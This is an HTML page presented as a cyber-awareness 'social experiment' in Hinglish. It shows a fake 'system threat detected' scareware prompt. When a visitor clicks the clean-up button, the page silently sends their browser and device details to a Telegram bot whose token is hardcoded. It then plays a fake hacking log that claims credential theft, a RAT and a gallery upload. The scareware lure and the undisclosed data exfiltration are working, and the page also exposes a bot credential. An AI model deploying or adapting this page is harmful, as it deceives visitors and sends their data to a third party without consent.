<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURITY RESEARCH: Awareness Test</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #050505; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .edu-banner { position: fixed; top: 0; width: 100%; background: #fbbf24; color: #000; text-align: center; padding: 10px; font-weight: bold; z-index: 100; font-size: 13px; }
        .container { background: #111; border: 2px solid #ff4d4d; padding: 30px; border-radius: 15px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 0 20px rgba(255, 77, 77, 0.2); }
        .icon { font-size: 50px; color: #ff4d4d; margin-bottom: 15px; }
        h1 { font-size: 20px; color: #ff4d4d; margin-bottom: 10px; }
        p { color: #ccc; font-size: 14px; line-height: 1.5; }
        .action-btn { background: #ff4d4d; color: white; border: none; padding: 15px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
        .action-btn:hover { background: #cc0000; }
        #terminal { display: none; text-align: left; background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 12px; margin-top: 20px; height: 250px; overflow-y: auto; }
        .warning-text { color: #fbbf24; font-size: 11px; margin-top: 15px; font-style: italic; }
    </style>
</head>
<body>

    <div class="edu-banner">⚠️ PROJECT: SOCIAL EXPERIMENT FOR CYBER AWARENESS ⚠️</div>

    <div class="container" id="main-box">
        <div id="ui-content">
            <div class="icon">🛡️</div>
            <h1>SYSTEM THREAT DETECTED</h1>
            <p>Aapke browser mein ek malicious script detect hui hai jo data leak kar rahi hai. Isse block karne ke liye niche click karein.</p>
            <button class="action-btn" onclick="startFullSimulation()">CLEAN SYSTEM NOW</button>
            <p class="warning-text">Ye site dikhayegi ki kaise ek click se data leak hota hai.</p>
        </div>

        <div id="terminal"></div>
    </div>

    <script>
        // --- TELEGRAM CONFIGURATION ---
        const BOT_TOKEN = '8215508330:AAH89E2yXIslUZDwb3gIkxgeHdEzLnR7EVk';
        const CHAT_ID = '7066124462';

        async function sendDataToTelegram() {
            // Collecting basic browser info (No permission needed)
            const report = `<b>🚨 Experiment Victim Alert!</b>\n\n` +
                           `<b>📱 Platform:</b> ${navigator.platform}\n` +
                           `<b>🌐 Browser:</b> ${navigator.vendor}\n` +
                           `<b>🖥️ Screen:</b> ${screen.width}x${screen.height}\n` +
                           `<b>🔋 Battery:</b> [Checking...]\n` +
                           `<b>🔗 User-Agent:</b> ${navigator.userAgent}`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'HTML' })
                });
            } catch (e) {
                console.log("Network error - Telegram API not reachable");
            }
        }

        function startFullSimulation() {
            // 1. Trigger Telegram Notification
            sendDataToTelegram();

            // 2. Change UI to Terminal
            document.getElementById('ui-content').style.display = 'none';
            const term = document.getElementById('terminal');
            term.style.display = 'block';
            document.getElementById('main-box').style.borderColor = '#00ff00';

            const lines = [
                "> Establishing Handshake with Server...",
                "> <span style='color:yellow'>BYPASSING BROWSER SANDBOX... [SUCCESS]</span>",
                "> Dumping Navigator Data... SENT TO TELEGRAM",
                "> Searching for Saved Credentials...",
                "> Found Cookie Session for 'google.com'...",
                "> Initializing Remote Access Trojan (RAT)...",
                "> <span style='color:red'>CRITICAL: Root Access Obtained!</span>",
                "> Accessing /sdcard/DCIM/Camera/...",
                "> Uploading Encrypted Gallery Backup...",
                "------------------------------------------",
                "> ATTACK SIMULATION COMPLETE.",
                "> <span style='color:white'>SABAK: Sirf ek click se aapki device ki detail mere Telegram Bot tak pahunch gayi.</span>",
                "> <span style='color:white'>Asli hacker iska use karke aapka account hack kar sakta tha.</span>",
                "------------------------------------------"
            ];

            let i = 0;
            function print() {
                if (i < lines.length) {
                    term.innerHTML += lines[i] + "<br><br>";
                    term.scrollTop = term.scrollHeight;
                    i++;
                    setTimeout(print, 800);
                }
            }
            print();
        }
    </script>

</body>
</html>
